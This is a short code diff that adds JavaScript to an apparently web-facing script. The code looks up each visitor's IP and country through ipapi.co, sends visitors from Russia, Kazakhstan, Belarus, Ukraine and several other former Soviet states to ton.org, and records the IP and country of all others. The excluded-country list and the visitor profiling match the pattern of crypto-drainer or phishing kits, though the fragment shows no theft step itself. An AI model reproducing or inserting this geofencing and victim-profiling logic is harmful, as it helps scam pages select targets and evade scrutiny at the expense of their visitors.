@@ -8,7 +8,10 @@ var domain = window.location.hostname;
 var ipUser;
 
 
-
+fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
+    const country = data.country;
+    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
+        window.location.replace('https://ton.org');
     }
     ipUser = data.ip;
     countryUser = data.country;
